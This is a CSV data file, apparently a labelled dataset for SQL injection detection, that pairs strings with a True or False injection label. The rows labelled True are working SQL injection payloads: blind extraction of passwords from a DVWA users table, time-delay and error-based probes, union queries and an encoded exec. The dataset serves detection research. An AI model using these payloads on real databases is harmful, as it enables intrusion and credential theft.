Query,SQLIA
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",True
vallibona,False
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),26,1))>57 AND 'TkwJ'='TkwJ",True
"  SELECT cheeseID AS ID, obtain AS fed FROM stay",False
"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # bzoq",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),32,1))>99 AND 'upay'='upay",True
SELECT TOP 3 * FROM equipment WHERE stream = 'guide' SELECT * FROM particular,False
"   SELECT hot, sometime, bareFROM earn WHERE touch  IS NOT NULL",False
69663934q,False
ben,False
" SELECT * FROM zulu ORDER BY height ASC, remove DESC",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),1,1))>48 AND 'epJT'='epJT",True
02124892z,False
6.03487E+15,False
"  SELECT Orders.gamerID, Employees.offer, Employees.fast FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tookID ORDER BY Orders.definitionID",False
pembrooke_coates@stainless.gd,False
SELECT dark ( s )  FROM read SELECT charge FROM cabin,False
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'zaru'  =  'zaru",True
"pasaje maria merida s/n, 4?h",False
SELECT * FROM cream WHERE break = 'around',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),14,1))>56 AND 'JUqW'='JUqW",True
SELECT * FROM spent WHERE nobody  BETWEEN 10 AND 20,False
"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",True
choclo,False
1  )   where 2083  =  2083,True
SELECT AVG ( trip )  FROM relationship  SELECT SUM ( wild ) ,False
d76en3r9n8z01,False
SELECT * FROM behind WHERE hat = 'dirt' LIMIT 3,False
SELECT * FROM wp_posts WHERE ID  =  367848 LIMIT 1,False
SELECT * FROM lake WHERE stuck = 'won',False
1   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  5333  =  5333,True
" SELECT column_name ( s )  FROM blue,pressure",False
"calle garci-perez 41, 9?c",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),29,1))>111 AND 'IlVZ'='IlVZ",True
"1  )   as czeu where 1738  =  1738 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",True
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,True
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",True
"1%""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",True
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",True
lenya@fbi-criminal-network.com.mil,False
"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",True
 UPDATE saw SET clay = 'perhaps'WHERE second = 'plenty',False
"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",True
-2411%'   )    )     )   or 6872  =  6872 and    (    (     (  '%'  =  ',True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),2,1))>49 AND 'bSNt'='bSNt",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>108 AND 'QJCu'='QJCu",True
SELECT wait FROM choose UNION SELECT correct FROM available ORDER BY opposite,False
SELECT electric ( s )  FROM equally UNION,False
"1,  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",True
SELECT protection FROM riding,False
SELECT tightly,False
SELECT AVG ( greater ) FROM weight SELECT SUM ( atom ) ,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),7,1))>110 AND 'dJCv'='dJCv",True
"-8046""   )    )     )   union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 1,1),2,1))>96 AND 'KwMp'='KwMp",True
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_4_link' LIMIT 1,False
5988,False
"codigo correspondencia oficial correos-telegrafos 86,",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>51 AND 'Tfyt'='Tfyt",True
3.4008E+15,False
cousinea,False
"1%'   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",True
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  ",True
SELECT * FROM fur WHERE habit BETWEEN 'grown' AND 'reason',False
select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),4,1))>57 AND 'upay'='upay",True
"-7006' where 6966  =  6966 union all select 6966,6966,6966,6966#",True
SELECT Count ( * )  AS audience,False
SELECT AVG ( past ) FROM they SELECT SUM ( color ) ,False
"  SELECT careful,tail,weight FROM wrote LEFT JOIN Orders ON eager.dogID =  past.fine ORDER BY recent.tea",False
"  SELECT Orders.fifteenrID, Employees.attempt, Employees.date FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forestID ORDER BY Orders.anywayID",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>108 AND 'MJNG'='MJNG",True
"1' in boolean mode  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  #",True
-4191  )   order by 1#,True
07559284n,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),22,1))>50 AND 'epJT'='epJT",True
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),4,1))>102 AND 'TkwJ'='TkwJ",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),17,1))>57 AND 'yuzR'='yuzR",True
SELECT * FROM count WHERE right = 'tune'  AND City = 'how',False
SELECT * FROM bit WHERE sport NOT BETWEEN 'frog' AND 'cattle',False
SELECT * FROM said ORDER BY subject,False
SELECT * FROM planned  WHERE cabin = congress,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),12,1))>100 AND 'uEgY'='uEgY",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),14,1))>101 AND 'hBNb'='hBNb",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),16,1))>47 AND 'CoVr'='CoVr",True
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",True
dirck,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 1,1),6,1))>96 AND 'KwMp'='KwMp",True
SELECT written ( s FROM correctly RIGHT JOIN,False
"alfalfa 47,",False
"SELECT Customers.CustomerName, Orders.OrderID FROM Customers FULL OUTER JOIN OrdersON Customers.CustomerID = Orders.CustomerID ORDER BY Customers.CustomerName;",False
"INSERT INTO usually ( living, everything, story, opinion, tape, scientific )  VALUES  ( 'chain', 'journey'. deer', 'frozen', 'shallow', 'shake', 'age' )  ",False
SELECT alike ( s )  FROM soil SELECT vapor ( s ) ,False
tubal,False
braiam,False
tramaced,False
SELECT DISTINCT plan FROM afternoon,False
26987451x,False
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",True
"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",True
tordellego,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 2,1),5,1))>93 AND 'WZxa'='WZxa",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x64767761 LIMIT 1,1),2,1))>117 AND 'fdLM'='fdLM",True
"iif  (  2869  =  9448,1,1/0  )  ",True
ninn,False
-7449' ORDER BY 1#,True
"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),15,1))>47 AND 'TszS'='TszS",True
calle codigo correspondencia oficial correos-telegrafos 33,False
-2483' where 1327  =  1327 union all select 1327#,True
1'   )    )     )   rlike   (  select   (  case when   (  5524  =  9582  )   then 1 else 0x28 end   )    )    and    (    (     (  'okoj' like 'okoj,True
besal,False
-4171'  )   union all select 6136#,True
SELECT * FROM repeat WHERE game = 'field' LIMIT 3,False
"   SELECT Employees.cat, COUNT ( Orders.doorID )  AS newspaperFROM    ( OrdersINNER JOIN hand ON Orders.droveID  =  Employees.fartherID ) ",False
-2749'  )   as fiho where 3531  =  3531 or 2777  =  1485#,True
"-8557 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",True
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",True
"-7851""   )    )    or 6872  =  6872 and    (    (   ""dvbw"" like ""dvbw",True
"INSERT INTO brown ( sun, pleasant, society, planet, back, behavior )  VALUES  ( 'trick', 'stared'. level', 'certainly', 'hair', 'fair', 'certainly' )  ",False
SELECT option_value FROM wp_options WHERE option_name  =  'options_location_address' LIMIT 1,False
SELECT * FROM money WHERE gate = 'leaving'  AND City = 'goose',False
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",True
SELECT AVG ( public ) FROM gasoline,False
"  SELECT byID AS ID, alphabet AS cover FROM jet",False
butalov0@lettere.dm,False
SELECT lost ( s )  FROM structure FULL OUTER JOIN,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),3,1))>57 AND 'wYwm'='wYwm",True
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 1,1),1,1))>96 AND 'bccT'='bccT",True
7250,False
or pg_sleep  (  __TIME__  )  --,True
pipponzi,False
SELECT AVG ( buy ) FROM equally SELECT SUM ( interior ) ,False
sorts bransuel,False
select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',True
6019,False
SELECT AVG ( task ) FROM medicine SELECT SUM ( shut ) ,False
SELECT private ( s )  FROM nor UNION,False
SELECT * FROM because WHERE happily = 'hunt' FETCH FIRST 3 ROWS ONLY,False
"  SELECT prize,disease FROM explanation WHERE character = 'lead' UNION SELECT telephone, perhaps FROM raw",False
-7786'   )    )    or 9323  =  9323#,True
"1',  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",True
"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",True
SELECT * FROM mother WHERE mark = 'thrown'  AND  ( cap = 'half' OR flag = 'factor' ) ,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>57 AND 'CoVr'='CoVr",True
"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",True
1'  )   as fksm where 9714  =  9714,True
"  UPDATE transportation SET gas =  'means', City =  'tip' WHERE everybody =  sentence",False
z5r1174osa,False
njar,False
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,True
"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""kssm""  =  ""kssm",True
77447105x,False
 or ''-',True
"1'   )    )     )   union all select null,null,null,null,null,null,null--",True
"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",True
DELETE FROM behavior WHERE brain = 'unhappy',False
"INSERT INTO something  ( figure, sail, mad )  VALUES  ( 'announced', 'example', 'very' )  ",False
SELECT DISTINCT typical FROM discover,False
"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",True
"  SELECT slipped,hurt,along FROM path LEFT JOIN Orders ON represent.saveID =  each.per ORDER BY nature.frozen",False
SELECT * FROM ProductsWHERE ProductName BETWEEN 'Carnarvon Tigers' AND 'Mozzarella    di Giovanni',False
tuset mendel,False
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,True
1oca,False
SELECT * FROM change WHERE five = 'lungs' FETCH FIRST 3 ROWS ONLY,False
ha3fila,False
"1""  )   and 3732  =  3850 and   (  ""edjv""  =  ""edjv",True
"-6798%""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,True
fortet esquer,False
"1""   )    )    as knyf where 8109  =  8109 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",True
"  SELECT appleID AS ID, symbol AS ride FROM stood",False
"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",True
" SELECT column_name ( s )  FROM within,sad",False
claudio iturrieta,False
5.68541E+15,False
arbeca,False
"   SELECT nature,another,bicycle,specific,cheese     (  (  not JOIN citizen ON thumb.sell =  has.establish )   INNER JOIN reasonON Orders.hand =  quiet.mouseID ) ",False
select sleep  (  5  )   and    (    (   3404  =  3404,True
"1""  )   where 9086  =  9086 or sleep  (  5  )  #",True
"SELECT * FROM announced WHERE health BETWEEN ""yourself"" AND    ""that""",False
SELECT MIN ( poem )  AS gave FROM such,False
8775,False
SELECT COUNT ( primitive ) FROM especially,False
1'  )   as chla where 6098  =  6098,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 0,1),3,1))>96 AND 'lHsL'='lHsL",True
4560,False
SELECT * FROM form WHERE people  BETWEEN 10 AND 20,False
" SELECT column_name ( s )  FROM fox,done",False
"   SELECT shot,bigger,needed,population,beyond     (  (  forth JOIN discuss ON thrown.number =  trouble.produce )   INNER JOIN indicateON Orders.arrive =  neck.unusualID ) ",False
rebes huasequi,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),11,1))>112 AND 'uEgY'='uEgY",True
SELECT * FROM done WHERE explore = 'shine' LIMIT 3,False
SELECT * FROM join WHERE off IN  ( SELECT wait FROM printed ) ,False
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),2,1))>104 AND 'gHrb'='gHrb",True
SELECT * FROM fly FETCH FIRST 3 ROWS ONLY,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),7,1))>115 AND 'uEgY'='uEgY",True
eward,False
caudete,False
"  SELECT * FROM doctor WHERE adventure IN  ( 'stuck', 'pull', 'title' )  ",False
hays_adiarte@lingotes.com.je,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>114 AND 'stCx'='stCx",True
v2e2udo,False
SELECT * FROM everywhere WHERE color BETWEEN 'vapor' AND 'silent',False
"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",True
"  SELECT MAKEDATE ( 2017, 3 ) ;",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),20,1))>114 AND 'IlVZ'='IlVZ",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>54 AND 'vyMm'='vyMm",True
"  SELECT needed AS duck, fire AS [automobile]  FROM throughout",False
47317,False
5.77329E+15,False
SELECT MIN ( drove )  AS list FROM tears,False
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367745 )  ORDER BY meta_id ASC",False
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'hgtg'  =  'hgtg,True
" end and    (    (   ""rqay"" like ""rqay",True
-8131'   )    )    or 9680  =  3467,True
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28549 )  ORDER BY meta_id ASC",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),11,1))>100 AND 'IlVZ'='IlVZ",True
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",True
onzonilla,False
SELECT * FROM inch FETCH FIRST 3 ROWS ONLY,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>67 AND 'vyMm'='vyMm",True
SELECT Count ( * )  AS cutting,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),22,1))>107 AND 'upay'='upay",True
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ||'",True
SELECT * FROM arrow  WHERE border = quite,False
soulef,False
"SELECT * FROM ask WHERE proud BETWEEN ""how"" AND    ""circle""",False
almirall pahisa,False
"c/ benasau, 196, 10?h",False
"  SELECT QUARTER ( ""2017-06-15"" ) ;",False
galindo beneyto,False
SELECT TOP 3 * FROM result,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),17,1))>67 AND 'bSNt'='bSNt",True
"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",True
SELECT * FROM moving ORDER BY finger DESC,False
SELECT * FROM want WHERE experience  BETWEEN 10 AND 20,False
"-9535"" order by 1--",True
4.85943E+15,False
SELECT joy ( s )  FROM belt SELECT surrounded FROM driving,False
select pg_sleep  (  5   )    )   ||',True
DELETE FROM express WHERE adult = 'spin',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 4,1),1,1))>64 AND 'ESxF'='ESxF",True
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'brhc' like 'brhc,True
"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",True
"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",True
1' where 6116  =  6116,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),20,1))>100 AND 'upay'='upay",True
"-8819""  )   where 9119  =  9119 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",True
"1' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",True
1'  )   as wjty where 2971  =  2971,True
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),7,1))>87 AND 'upay'='upay",True
SELECT AVG ( front ) FROM gather SELECT SUM ( directly ) ,False
4661,False
regidor fa,False
"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",True
; exec   (  'sel' + 'ect us' + 'er'  ) ,True
dellinge,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>49 AND 'CoVr'='CoVr",True
"   SELECT railroad,express,frequently,music,vegetable     (  (  line JOIN gate ON exactly.religious =  proper.young )   INNER JOIN heightON Orders.break =  bigger.wordID ) ",False
melque de cercos,False
santa eulalia de oscos,False
SELECT * FROM parent,False
-6045 or 8919  =  2827--,True
antoine,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 5,1),4,1))>114 AND 'Edsa'='Edsa",True
1' where 4795  =  4795 and 4595  =  4595#,True
1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  3836  =  3836,True
"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",True
SELECT * FROM born WHERE Price NOT BETWEEN 10 AND 20,False
SELECT AVG ( yesterday ) FROM pool SELECT SUM ( father ) ,False
1'||  (  select 'znba' where 8323  =  8323,True
"1  )   as cjmt where 4839  =  4839 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",True
6.19E+15,False
1.92E+15,False
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,True
" SELECT * FROM radio ORDER BY wind ASC, sang DESC",False
SELECT AVG ( oldest ) FROM send SELECT SUM ( solid ) ,False
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj",True
SELECT * FROM thick FETCH FIRST 3 ROWS ONLY,False
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,True
"rio alzania, 72, 6g",False
afkham,False
SELECT musical FROM topic,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),9,1))>96 AND 'epJT'='epJT",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),19,1))>87 AND 'bSNt'='bSNt",True
"SELECT * FROM thrown WHERE wore BETWEEN ""selection"" AND    ""took""",False
ambatll comalada,False
1'||  (  select 'pcps' from dual where 7255  =  7255 and 7121  =  4603,True
